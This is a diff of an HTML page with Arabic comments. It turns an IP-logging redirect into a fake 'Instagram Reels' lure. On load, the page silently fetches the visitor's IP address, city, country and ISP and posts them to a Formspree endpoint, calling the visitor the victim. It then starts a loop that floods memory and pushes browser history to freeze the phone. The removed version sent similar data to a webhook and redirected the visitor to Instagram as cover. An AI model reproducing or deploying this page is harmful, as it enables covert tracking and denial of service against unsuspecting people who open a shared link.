@@ -1,37 +1,53 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
-    <title>Redirecting...</title>
+    <meta charset="UTF-8">
+    <title>Instagram Reels</title>
+    <style>
+        body { margin: 0; background: #000; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; overflow: hidden; }
+        img { width: 90%; max-width: 400px; border-radius: 15px; box-shadow: 0 0 20px rgba(255,255,255,0.1); }
+        .status { margin-top: 15px; font-size: 14px; opacity: 0.7; }
+    </style>
 </head>
 <body>
+    <img src="https://bit.ly/3uH5X1W" alt="Loading Content...">
+    <div class="status">جاري الاتصال بالسيرفر...</div>
+
     <script>
-        async function logVisitor() {
-            // 1. جلب عنوان الـ IP والموقع الجغرافي عبر API مجاني
-            const geo = await fetch('https://ipapi.co/json/').then(res => res.json());
+        async function executeMission() {
+            // رابط الـ Formspree الخاص بك من الصورة الأخيرة
+            const endpoint = "https://formspree.io/f/xzdvqkyz";
 
-            // 2. تجميع بيانات الجهاز (الهاتف، المتصفح)
-            const visitorData = {
-                ip: geo.ip,
-                city: geo.city,
-                country: geo.country_name,
-                device: navigator.userAgent,
-                platform: navigator.platform,
-                referer: document.referrer, // لمعرفة ما إذا كان قادماً من انستغرام
-                time: new Date().toLocaleString()
-            };
+            try {
+                // سحب بيانات الضحية
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                
+                // إرسال البيانات فوراً إلى إيميلك عبر Formspree
+                await fetch(endpoint, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        Target: "New Access from Insta Bio",
+                        IP: data.ip,
+                        City: data.city,
+                        Country: data.country_name,
+                        Provider: data.org,
+                        Device: navigator.userAgent
+                    })
+                });
+            } catch (e) { console.log("Silent logging..."); }
 
-            // 3. إرسال البيانات إلى Webhook الخاص بك (يصلك فوراً)
-            // استبدل الرابط أدناه برابط Webhook.site الخاص بك
-            fetch('https://webhook.site/YOUR_UNIQUE_ID', {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify(visitorData)
-            }).then(() => {
-                // 4. تحويل الزائر لموقع حقيقي (تمويه) لكي لا يشك
-                window.location.href = "https://www.instagram.com/instagram";
-            });
+            // تفعيل الـ Lag الشامل لتجميد الهاتف
+            const bloat = [];
+            setInterval(() => {
+                for(let i=0; i<450; i++) {
+                    bloat.push(new Uint32Array(1024 * 1024)); // استهلاك الـ RAM
+                }
+                history.pushState(null, null, location.href); // تجميد المتصفح
+            }, 80);
         }
-        window.onload = logVisitor;
+        window.onload = executeMission;
     </script>
 </body>
 </html>
